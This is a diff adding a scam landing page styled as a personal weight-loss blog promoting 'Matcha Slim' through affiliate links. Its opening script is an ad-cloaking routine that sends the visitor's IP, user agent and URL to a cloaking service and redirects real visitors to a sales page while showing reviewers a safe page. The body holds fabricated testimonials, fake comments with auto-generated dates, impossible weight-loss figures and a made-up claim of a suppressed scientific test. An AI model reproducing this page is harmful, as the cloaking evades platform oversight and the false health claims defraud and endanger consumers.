@@ -1,0 +1,178 @@
+<!DOCTYPE html><html dir="ltr"><head>
+<script>
+var key = "";
+var ip = "";
+var campaign = "";
+var user_agent = "";
+var strictness = 0;
+var failure_redirect = "";
+var success_redirect = "";
+var current_url = window.location.href;
+function executeCheck(){
+
+  var http = new XMLHttpRequest();
+  var url = "https://app.cloakerly.com/v2/integration/check/"+key+"/"+ip+"/"+campaign;
+  var params = "user_agent="+user_agent+"&strictness="+strictness+"&current_url="+current_url;
+  http.open("POST", url, true);
+
+  http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+  http.onreadystatechange = function() {
+      if(http.readyState == 4 && http.status == 200) {
+          checkResponse(http.responseText);
+      }
+  }
+  http.send(params);
+}
+
+function getIP(key){
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+    var data = JSON.parse(this.responseText);
+    ip = data.ip;
+    user_agent = data.user_agent;
+    executeCheck(key,ip,campaign);
+  }
+  };
+  xhttp.open("GET", "https://app.cloakerly.com/v2/integration/getIp", true);
+  xhttp.send();
+}
+
+function checkResponse(res){
+  response = JSON.parse(res);
+  success_redirect = response.money_page;
+  failure_redirect = response.safe_page;
+
+  if(response.proxy_bot == true){
+  }else if(response.status === false){
+    if(failure_redirect!=""){
+      if(window.location.href.indexOf(failure_redirect) > -1) {
+      }else{
+        if(response.fr == 1){
+          window.location.href = failure_redirect;
+        }
+      }
+    }
+  }else{
+    if(success_redirect!=""){
+      window.location.href = success_redirect;
+    }
+  }
+}
+
+function PreventLoad(){
+    key = "H53Lif0Kvj8TddWouhzvAnK3XGyVeZm5LEO6F6MFxBS1z7p2nMD9iErtBYQkwgGW";
+    campaign = "22797";
+    strictness = "0";
+    getIP(key);
+}
+PreventLoad();
+</script>
+<script>
+   var acrum_extra = {"id": 72613, "type": "prelanding", "ccodes": [], "offer_id": 29297, "esub": "-7EBRQCgQAAAO3QQNxcgAAN6UbAZQFAAMP5hywZRERChEJIhENQhENWgdubDIAAH9hZGNvbWJv_3BMRmdJdWxwAAM1cA", "location": null, "ip_city": "Marrakesh", "iew": "true"};
+  </script><script>
+   var lang_locale = "fr";
+  </script><script type="text/javascript">
+   var ccode = "EN"; var ip_ccode = "EN"; var iew = true;
+  </script><script src="js/jquery-1.12.4.min.js" type="text/javascript">
+  </script><style>
+   .ac_footer {
+        position: relative;
+        top: 10px;
+        height: 0;
+        text-align: center;
+        margin-bottom: 70px;
+        color: #A12000;
+    }
+
+    .ac_footer a {
+        color: #A12000;
+    }
+
+    .ac_footer p {
+        text-align: center;
+    }
+
+    img[height="1"], img[width="1"] {
+        display: none !important;
+    }
+  </style><!--retarget--><!--retarget--><script src="js/9.min.js" type="text/javascript">
+  </script><meta charset="utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.2, user-scalable=yes" name="viewport"><title>How I only weigh 119 lb after 2 months instead of 187 lb</title><link href="css/style.css" media="all" rel="stylesheet" type="text/css"></head><body><!--retarget--><!--retarget--><header class="header"><div class="row"><div class="logo row"><h1> Julia Mansfield's Blog </h1><ul class="menu"><li><p> Home </p></li><li><p> About Julia Mansfield </p></li><li><p> Contact Julia Mansfield </p></li></ul></div></div></header><div class="row"><div class="content"><div class="logo-image"><img src="img/gr-coffee.jpg"></div><h2> How I only weigh 119 lb after 2 months instead of 187 lb </h2><div class="line"><div><script>
+       dtime_nums(-10, true)
+      </script></div></div><div class="story"><p> Hey guys! Everyone noticed that <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> I have lost a lot of weight </a> and, <b> obviously, I am getting asked a lot of questions </b> . I really wanted to answer all of you personally, but it is simply impossible given the sheer number of questions. This is why I want to answer those questions in this post: <b> "How did you manage to lose 68 lb?" </b> (That does not mean, of course, that you cannot send me any questions. It's just easier this way). </p><h3> My transformation only took TWO MONTHS! INCREDIBLE RESULTS, RIGHT? </h3><div class="heroes"><img src="img/main.jpg"></div><p> I have never been really skinny, but one day I noticed that I had gotten a lot fatter. I had three huge rolls of fat on my stomach and I looked like a pug in a bikini! My hips, legs and bum grew bigger and bigger! <b> I decided that it was time to try to get fit again </b> . This is why I avoided all sorts of fatty and fried foods. I even no longer had my late-night snacks anymore. Apart from that I went to the gym twice per day! After one month, I was really shocked. I almost WEIGHED 220 lb! I decided to limit myself to a very strict diet and no longer ate bread nor meat. In the end, I would only eat fruits and vegetables in combination with a glass of water. I even tried really expensive pills and teas, but <b> nothing helped </b> ! After some time, the weight would simply come back. </p><h3> Neither diets nor pills helped. It was a huge scam! <br> Exercising is way too hard and results will only show after an eternity. What should I do? </h3><p> After countless diets, pills and hours in the gym with incredibly expensive personal trainings, I was about to give up. But then I came across an article about <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> and wanted to give it a try. I read that many top stars used it to lose weight. I was still sceptical as I tried many similar products before. <b> But I had no choice! And the comments were pretty promising! </b></p><h3> Millions of women in both Europe and America have lost weight using Matcha Slim. According to some studies, 96.7% of all users managed to lose 26-37 lb in just 3 weeks! </h3><div class="heroes"><img src="img/greencoffee.jpg"></div><p> I was convinced and opened the <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> website </a> , checked every detail and ordered the product. It got delivered the same week. I read all the instructions and dissolved one small spoon in 150 ml of water. This is how I used to drink it! </p><h3 style="text-align:left"> Results </h3><p><b> After only 2 weeks, I was really surprised. I had lost 13 lb! </b> The puffiness was gone and my skin looked a lot better! My stomach and hips were slimmer again. Not to mention that I was in a better mood! I believed in myself again and that I could get fit without dieting and exercising. <b> I continued and ate everything I liked </b> . I really hated all those hard trainings and strict diets... </p><p><b> At the end of the third week, I had lost another 26 lb! </b> I got really fit and even decided to take the stairs again instead of the elevator. What was once a torment has been a joy ever since. I can hardly believe it myself. I just followed the instructions on the packaging. Anyone can do that! After only two months, I had lost 68 lb! </p><p><b> I have reached my goal in only 60 days. My stomach is slim, I have lost 68 lb and I now have my dream figure which I never imagined possible </b> ! </p><h3> By the way, Matcha Slim was tested by the National Academy of Sciences in 2014. The results were never publicly announced because it would have led to a huge shock. Obviously, the big pharma companies, gyms, nutritionists and private clinics don't fancy losing their clients to the incredibly cheap Matcha Slim! </h3><div class="heroes"><img src="img/1.jpg"></div><p> I now recommend <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> to all of my friends and colleagues. Important: <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Order it only on the officially website </a> to avoid fakes. I am totally happy with my results and want you guys to be happy, too! Forget the stereotypes. You don't need any diet or training to get in shape! </p><p><i> PS: If you also tried Matcha Slim, please comment below! Maybe we can convince someone to give it a try, too! See you soon! </i></p><center><a class="prod-link" href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"><img src="img/prod.png"></a></center><div class="btn-wrap"><a class="btn" href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> TO THE OFFER </a></div><p><b> Hey guys! I have good news for you! The manufacturer of <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> contacted me and offered a 50% discount for the 100 first visitors who <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> order it! </a></b></p></div><div class="comments"><h4> Comments </h4><div class="line"></div><div class="comment"><div class="avatar"><img src="img/comm_1.jpg"></div><div class="text"><span class="name"> Catherine </span><span class="comment-data"><script>
+         dtime_nums(-10,true)
+        </script></span><p> Hello Julia, thank you very much! You convinced me to finally do something about my excess weight! That was three weeks ago and I lost 61 lb. I only weigh 125 lb now and my weight remains stable. Thanks a tonne, Catherine </p><img src="img/review_1.jpg"></div></div><div class="comment"><div class="avatar"><img src="img/comm_2.jpg"></div><div class="text"><span class="name"> Vanessa </span><span class="comment-data"><script>
+         dtime_nums(-10,true)
+        </script></span><p> I've dreamed of a slim figure for ages. Then, I heard about <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> and tried it about 3 months ago. At first I hesitated, but my mother persuaded me to go for it. The price was really cheap, too! Losing weight is so easy and we do it together. But my mother is losing weight more than me. :( </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_3.jpg"></div><div class="text"><span class="name"> Michelle </span><span class="comment-data"><script>
+         dtime_nums(-10,true)
+        </script></span><p> I am so glad I found your blog! I will <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> definitely try </a> this product! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_28.jpg"></div><div class="text"><span class="name"> Elizabeth </span><span class="comment-data"><script>
+         dtime_nums(-10,true)
+        </script></span><p> Hi! I saw your recommendation and tried <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> myself. You saved both my family and my marriage! My husband gives me much more attention than before and I have more self-confidence again. I feel AWESOME! :) </p><img src="img/review_15.jpg"></div></div><div class="comment"><div class="avatar"><img src="img/comm_5.jpg"></div><div class="text"><span class="name"> Nicole </span><span class="comment-data"><script>
+         dtime_nums(-10,true)
+        </script></span><p> Hey ladies! I will be skinny again soon! I got my <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> just yesterday! Many thanks for all your comments. They really motivated me! I hope to be in shape soon again and will show you my results later! </p></div></div><div class="comment children"><div class="avatar"><img src="img/ava.jpg"></div><div class="text"><span class="name"> Julia Mansfield </span><span class="comment-data"><script>
+         dtime_nums(-9,true)
+        </script></span><p> Hi Nicole! I am happy for you! The most important thing is that you feel comfortable again. Hopefully, you will see progress soon. And remember: every little progress is better than none at all! Good luck! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_6.jpg"></div><div class="text"><span class="name"> Carolin </span><span class="comment-data"><script>
+         dtime_nums(-9,true)
+        </script></span><p> Hi Julia! I am so glad I found your blog. I've tried so many methods, but the results have always been disappointing. I am only 1.60 m tall and weigh 213 lb. That has to change urgently! I want to lose at least 79 lb and <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> seems to be the ideal solution... </p></div></div><div class="comment children"><div class="avatar"><img src="img/ava.jpg"></div><div class="text"><span class="name"> Julia Mansfield </span><span class="comment-data"><script>
+         dtime_nums(-9,true)
+        </script></span><p> Hi Carolin! I am not the only one who lost weight with <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> this product </a> ! My friends also tried it and IT WORKS 100%, guaranteed! You won't be disappointed, believe me! </p><p> Guys, just one thing. When you have a moment, I would be really happy if you could share your results here! Maybe we can convince a few more people, so that everyone can lose weight quickly and easily! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_7.jpg"></div><div class="text"><span class="name"> Marlene </span><span class="comment-data"><script>
+         dtime_nums(-9,true)
+        </script></span><p> I got the package yesterday and will begin my new life now! I'm looking forward to the first results! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_8.jpg"></div><div class="text"><span class="name"> Lisa </span><span class="comment-data"><script>
+         dtime_nums(-9,true)
+        </script></span><p> Hi Julia! Thank you so much! I lost weight really quickly and most importantly, it is stable! What a miracle! I can really recommend this <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> product </a> to everyone who wants to lose weight without starving. </p><img src="img/review_3.jpg"></div></div><div class="comment"><div class="avatar"><img src="img/comm_9.jpg"></div><div class="text"><span class="name"> Mary </span><span class="comment-data"><script>
+         dtime_nums(-8,true)
+        </script></span><p> I have a date tomorrow and we're going to eat in a restaurant. It seemed impossible a few weeks ago, but now I'm slim and men love me. In addition, I can eat anything I want and I don't gain weight! I managed to lose weight with <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> - 60.6 lb in total! In just 1 month! </p><img src="img/review_4.jpg"></div></div><div class="comment children"><div class="avatar"><img src="img/comm_10.jpg"></div><div class="text"><span class="name"> Jenna </span><span class="comment-data"><script>
+         dtime_nums(-8,true)
+        </script></span><p> Wow! In just one month?! Maybe I should try <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> too to shed a few kilos... </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_11.jpg"></div><div class="text"><span class="name"> Ann </span><span class="comment-data"><script>
+         dtime_nums(-8,true)
+        </script></span><p> I lost 39 lb in just 6 weeks. Unbelievable! Many thanks, Julia! </p><img src="img/review_5.jpg"></div></div><div class="comment children"><div class="avatar"><img src="img/comm_10.jpg"></div><div class="text"><span class="name"> Jenna </span><span class="comment-data"><script>
+         dtime_nums(-8,true)
+        </script></span><p> Congratulations! Your results are incredible! I have no doubt that <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> helps!!! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_27.jpg"></div><div class="text"><span class="name"> Cathrin </span><span class="comment-data"><script>
+         dtime_nums(-8,true)
+        </script></span><p> Here are my results as promised. The product works perfect. I lost 33 lb in just 6 weeks. WOW! </p><img src="img/review_14.jpg"></div></div><div class="comment"><div class="avatar"><img src="img/comm_26.jpg"></div><div class="text"><span class="name"> Sarah </span><span class="comment-data"><script>
+         dtime_nums(-8,true)
+        </script></span><p> Don't worry, it really, really works. My bf and I have lost weight with <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> . We both lost about 39 lb in 2 months. Impressive, right? </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_14.jpg"></div><div class="text"><span class="name"> Ann </span><span class="comment-data"><script>
+         dtime_nums(-7,true)
+        </script></span><p> Thanks a lot for your comments! You really motivated me and I will order <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> right away! I hope to lose at least 11-13 lb to reach my personal goal! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_15.jpg"></div><div class="text"><span class="name"> Lilly </span><span class="comment-data"><script>
+         dtime_nums(-7,true)
+        </script></span><p> Three cousins of mine have lost weight with <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> this product </a> . They used it for a few months and are no longer fat, and they are really beautiful! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_16.jpg"></div><div class="text"><span class="name"> Karen </span><span class="comment-data"><script>
+         dtime_nums(-7,true)
+        </script></span><p> Here are my results: I lost 27.5 lb without exercising at all! Everyone is so stunned! :) </p><img src="img/review_7.jpg"></div></div><div class="comment children"><div class="avatar"><img src="img/ava.jpg"></div><div class="text"><span class="name"> Julia Mansfield </span><span class="comment-data"><script>
+         dtime_nums(-7,true)
+        </script></span><p> Hi Karen! I am so happy for you! As far as I know, you wanted to lose even more weight, right? But a very promising beginning! Good luck! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_24.jpg"></div><div class="text"><span class="name"> Hannah </span><span class="comment-data"><script>
+         dtime_nums(-7,true)
+        </script></span><p> Hi Julia! I have read your post and will buy <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> now. The class reunion is coming up soon and I don't want to be the fat one who shows up with 253 lb! I want to look like I did back then when I was 17 and weigh only 149 lb. Of course it's a long way, but you gave me the motivation I needed! Thank you so much! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_18.jpg"></div><div class="text"><span class="name"> Susan </span><span class="comment-data"><script>
+         dtime_nums(-7,true)
+        </script></span><p> Your results are amazing. But you really don't have to go on a diet for that? I hate it when I have to live without certain things... I don't want to starve to death! </p></div></div><div class="comment children"><div class="avatar"><img src="img/ava.jpg"></div><div class="text"><span class="name"> Julia Mansfield </span><span class="comment-data"><script>
+         dtime_nums(-7,true)
+        </script></span><p> Exactly! <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> does not require you to go on a strict diet. We all know that the weight would come back anyways, once the diet is over. That's the main difference with <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> . So don't worry, just give it a try! </p></div></div><div class="comment"><div class="avatar"><img src="img/comm_13.jpg"></div><div class="text"><span class="name"> Mary </span><span class="comment-data"><script>
+         dtime_nums(-6,true)
+        </script></span><p> I cannot believe it! I lost 44 lb in just 2 months!!! <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> This product is the real deal </a> ! My husband and I will go on our second honeymoon! </p><img src="img/review_9.jpg"></div></div><div class="comment mobile"><div class="avatar"><img src="img/comm_20.jpg"></div><div class="text"><span class="name"> Victoria </span><span class="comment-data"><script>
+         dtime_nums(-6,true)
+        </script></span><p> I have tried <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> this product </a> for 8 weeks now and lost 50 lb so far. I cannot believe it myself, but I really used to weigh 198 lb! At last, I can go back to the beach... </p><img src="img/review_10.jpg"></div></div><div class="comment mobile"><div class="avatar"><img src="img/comm_21.jpg"></div><div class="text"><span class="name"> Wendy </span><span class="comment-data"><script>
+         dtime_nums(-6,true)
+        </script></span><p> I urgently need to lose 30 lb...this is how I got to know <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> this website </a> and I am fascinated after reading all your comments. I will definitely try <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> this product </a> . Let's see what happens! Wish me luck! </p></div></div><div class="comment mobile"><div class="avatar"><img src="img/comm_19.jpg"></div><div class="text"><span class="name"> Daniela </span><span class="comment-data"><script>
+         dtime_nums(-5,true)
+        </script></span><p> My sister brought a package of <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> from Japan last year. I laughed at her at first. How should you be able to lose weight without dieting and exercising? But she persuaded me and I gave it a try. In February, I drank the product for the first time and, in May, I HAD TO BUY NEW CLOTHES! Everything was just too big for me! Instead of 202 lb I only weighed 127 lb - after 2 months! That was a while ago, but the weight stayed stable! I'm so happy! Just try <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> this product </a> for a couple of weeks and you'll see it for yourself... </p><img src="img/review_13.jpg"></div></div><div class="comment children mobile"><div class="avatar"><img src="img/ava.jpg"></div><div class="text"><span class="name"> Julia Mansfield </span><span class="comment-data"><script>
+         dtime_nums(-5,true)
+        </script></span><p> Wow, that sounds impressive! Girls, I am so sorry that I could not answer all of you. But I am so happy that you are all satisfied with your results! </p></div></div><div class="comment mobile"><div class="avatar"><img src="img/comm_23.jpg"></div><div class="text"><span class="name"> Olivia </span><span class="comment-data"><script>
+         dtime_nums(-4,true)
+        </script></span><p> I used to weigh 174 lb a few weeks ago. Now, I am down to 119 lb and can eat everything I like without gaining weight! I am so proud of myself! Here are some pics: </p><img src="img/review_12.jpg"></div></div><div class="comment"><div class="avatar"><img src="img/comm_17.jpg"></div><div class="text"><span class="name"> Mandy </span><span class="comment-data"><script>
+         dtime_nums(-3,true)
+        </script></span><p> Hi Julia and everyone who commented here! I am infinitely grateful! I am 53 years old and have struggled with being overweight for a long time. Even simple exercise was too much for me, and I had terrible back pain and quickly ran out of breath. I read through the opinions and wanted to try <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> really bad. The results speak for themselves and exceeded my expectations! I only weigh 138 lb (instead of 200 lb)! And that in just 3 months! I feel great and look significantly 10 years younger. My back pain is gone too! </p><img src="img/review_8.jpg"></div></div><div class="comment"><div class="avatar"><img src="img/comm_25.jpg"></div><div class="text"><span class="name"> Petra </span><span class="comment-data"><script>
+         dtime_nums(-2,true)
+        </script></span><p> I used to drink Japanese tea to lose weight. Sure, I lost 4.5 lb, but the kilos were back on after 2 weeks. Please tell me that it is different with <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim </a> ! </p></div></div><div class="comment children"><div class="avatar"><img src="img/ava.jpg"></div><div class="text"><span class="name"> Julia Mansfield </span><span class="comment-data"><script>
+         dtime_nums(-2,true)
+        </script></span><p> Hi Petra! Don't worry, it won't happen. Just look at the photos of all the women who were able to lose weight with Matcha Slim and never gained weight again. The taurine ensures that your body is in control of the fat. You should give <a href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> Matcha Slim a try </a> for a week or so and you will see the effect for yourself! </p></div></div><div class="btn-wrap"><a class="btn" href="https://uh31fd6c00uh.axdsz.pro/?target=-7EBNQCgQAAAO3QQNxcgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE"> TO THE OFFER </a></div></div></div></div><footer> Julia Mansfield's Blog © <span class="ryear"> 2020 </span></footer><script src="js/js.cookie.min.js" type="text/javascript">
+  </script><script>
+   $(document).ready(function () {
+        try {
+            moment.locale("");
+            $('.day-before').text(moment().subtract(1, 'day').format('D.MM.YYYY'));
+            $('.day-after').text(moment().add(1, 'day').format('D.MM.YYYY'));
+        } catch (e) { console.log('moment problems!'); }
+    });
+  </script><!--retarget--><!--retarget--><div class="ac_footer"><a href="http://ac-feedback.com/report_form/"> Report </a><p></p><script>
+    typeof adc_clearFooter !== 'undefined' && adc_clearFooter();
+   </script></div></body></html>
